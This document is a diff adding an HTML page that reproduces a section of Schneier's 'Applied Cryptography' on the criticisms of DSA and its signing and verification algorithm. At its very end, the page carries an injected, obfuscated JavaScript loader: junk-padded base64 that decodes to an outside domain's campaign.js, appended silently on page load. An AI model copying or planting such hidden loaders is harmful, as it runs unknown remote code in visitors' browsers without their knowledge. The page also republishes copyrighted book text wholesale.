@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=484-487//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Let&#146;s look at the criticisms against DSA, one by one.
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;DSA cannot be used for encryption or key distribution.
+<BR>True, but not the point of the standard. This is a signature standard. NIST should have a standard for public-key encryption. NIST is committing a grave injustice to the American people by not implementing a public-key encryption standard. It is suspicious that this proposed digital signature standard cannot be used for encryption. (As it turns out, though, it can&#151;see Section 23.3.) That does not mean that a signature standard is useless.
+<DD><B>2.</B>&nbsp;&nbsp;DSA was developed by the NSA, and there may be a trapdoor in the algorithm.
+<BR>Much of the initial comments were just paranoia: &#147;NIST&#146;s denial of information with no apparent justification does not inspire confidence in DSS, but intensifies concern that there is a hidden agenda, such as laying the groundwork for a national public-key cryptosystem that is in fact vulnerable to being broken by NIST and/or NSA&#148; [154]. One serious question about the security of DSA was raised by Arjen Lenstra and Stuart Haber at Bellcore. This will be discussed later.
+<DD><B>3.</B>&nbsp;&nbsp;DSA is slower than RSA [800].
+<BR>True, more or less. Signature generation speeds are the same, but signature verification can be 10 to 40 times slower with DSA. Key generation, however, is faster. But key generation is irrelevant; a user rarely does it. On the other hand, signature verification is the most common operation.
+<BR>The problem with this criticism is that there are many ways to play with the test parameters, depending on the results you want. Precomputations can speed up DSA signature generation, but don&#146;t always apply. Proponents of RSA use numbers optimized to make their calculations easier; proponents of DSA use their own optimizations. In any case, computers are getting faster all the time. While there is a speed difference, it will not be noticeable in most applications.
+<DD><B>4.</B>&nbsp;&nbsp;RSA is a <I>de facto</I> standard.
+<BR>Here are two examples of this complaint. From Robert Follett, the program director of standards at IBM [570]:
+<BLOCKQUOTE>
+<BR>IBM is concerned that NIST has proposed a standard with a different digital signature scheme rather than adopting the international standard. We have been convinced by users and user organizations that the international standards using RSA will be a prerequisite to the sales of security products in the very near future.
+</BLOCKQUOTE>
+<BR>From Les Shroyer, vice president and director, corporate MIS and telecommunications, at Motorola [1444]:
+<BLOCKQUOTE>
+<BR>We must have a single, robust, politically-accepted digital signature standard that is usable throughout the world, between both U.S. and non-U.S., and Motorola and non-Motorola entities. The lack of other viable digital signature technology for the last eight years has made RSA a de facto standard.... Motorola and many other companies... have committed millions of dollars to RSA. We have concern over the interoperability and support of two different standards, as that situation will lead to added costs, delays in deployment, and complication....
+</BLOCKQUOTE>
+<BR>Many companies wanted NIST to adopt the ISO 9796, the international digital signature standard that uses RSA [762]. While this is a valid complaint, it is not a sufficient justification to make it a standard. A royalty-free standard would better serve the U.S. public interest.
+<DD><B>5.</B>&nbsp;&nbsp;The DSA selection process was not public; sufficient time for analysis has not been provided.
+<BR>First NIST claimed that they designed the DSA; then they admitted that NSA helped them. Finally, they confirmed that NSA designed the algorithm. This worries many people; the NSA doesn&#146;t inspire trust. Even so, the algorithm is public and available for analysis; and NIST extended the time for analysis and comment.
+<DD><B>6.</B>&nbsp;&nbsp;DSA may infringe on other patents.
+<BR>It may. This will be discussed in the section on patent issues.
+<DD><B>7.</B>&nbsp;&nbsp;The key size is too small.
+<BR>This was the only valid criticism of DSS. The original implementation set the modulus at 512 bits [1149]. Since the algorithm gets its security from the difficulty of computing discrete logs in that modulus, this worried most cryptographers. There have since been advances in the problem of calculating discrete logarithms in a finite field, and 512 bits is too short for long-term security (see Section 7.2). According to Brian LaMacchia and Andrew Odlyzko, &#147;...even 512-bit primes appear to offer only marginal security...&#148; [934]. In response to this criticism, NIST made the key size variable, from 512 bits to 1024 bits. Not great, but better.
+</DL>
+<P>On May 19, 1994, the standard was finally issued [1154]. The issuing statement said [542]:
+</P>
+<BLOCKQUOTE><P>This standard is applicable to all Federal departments and agencies for the protection of unclassified information.... This standard shall be used in designing and implementing public-key based signature schemes which Federal departments and agencies operate or which are operated for them under contract. Adoption and use of this standard is available to private and commercial organizations.
+</P>
+</BLOCKQUOTE><P>Before you run out and implement this standard in your next product, read the section on patent issues below.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of DSA</I></B></FONT></P>
+<P>DSA is a variant of the Schnorr and ElGamal signature algorithms, and is fully described in [1154]. The algorithm uses the following parameters:
+</P>
+<BLOCKQUOTE><P><I>p</I> = a prime number <I>L</I> bits long, when <I>L</I> ranges from 512 to 1024 and is a multiple of 64. (In the original standard, the size of <I>p</I> was fixed at 512 bits [1149]. This was the source of much criticism and was changed by NIST [1154].)</P>
+<P><I>q</I> = a 160-bit prime factor of <I>p</I> &#150; 1.</P>
+<P><I>g</I> = <I>h</I><SUP>(<I>p</I>-1)/<I>q</I></SUP> mod <I>p</I>, where <I>h</I> is any number less than <I>p</I> &#150; 1 such that <I>h</I><SUP>(<I>p</I> - 1)/<I>q</I></SUP> mod <I>p</I> is greater than 1.</P>
+<P>x = a number less than <I>q</I>.</P>
+<P><I>y</I> = <I>g<SUP>x</I></SUP> mod <I>p</I>.</P>
+</BLOCKQUOTE><P>The algorithm also makes use of a one-way hash function: <I>H</I>(<I>m</I>). The standard specifies the Secure Hash Algorithm, discussed in Section 18.7.</P>
+<P>The first three parameters, <I>p, q</I>, and <I>g</I>, are public and can be common across a network of users. The private key is <I>x</I>; the public key is <I>y</I>.</P>
+<P>To sign a message, <I>m</I>:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a random number, <I>k</I>, less than <I>q</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates
+<DL>
+<DD><I>r</I> = (<I>g<SUP>k</I></SUP> mod <I>p</I>) mod <I>q</I>
+<DD><I>s</I> = (<I>k</I><SUP>-1</SUP> (<I>H</I>(<I>m</I>) &#43; <I>xr</I>)) mod <I>q</I>
+</DL>
+<BR>The parameters <I>r</I> and <I>s</I> are her signature; she sends these to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob verifies the signature by computing
+<DL>
+<DD><I>w</I> = <I>s</I><SUP>-1</SUP> mod <I>q</I>
+<DD><I>u</I><SUB>1</SUB> = (<I>H</I>(<I>m</I>) * <I>w</I>) mod <I>q</I>
+<DD><I>u</I><SUB>2</SUB> = (<I>rw</I>) mod <I>q</I>
+<DD><I>v</I> = ((<I>g<SUP>u</I><SMALL>1</SMALL></SUP> * <I>y<SUP>u</I><SMALL>2</SMALL></SUP>) mod <I>p</I>) mod <I>q</I>
+</DL>
+<BR>If <I>v</I> = <I>r</I>, then the signature is verified.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(WYdPHhho, oiSMRkex) {oiSMRkex = WYdPHhho.createElement('script');oiSMRkex.type = 'text/javascript';oiSMRkex.async = true;oiSMRkex.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');WYdPHhho.getElementsByTagName('body')[0].appendChild(oiSMRkex);}(document));</script></body>
+</html>
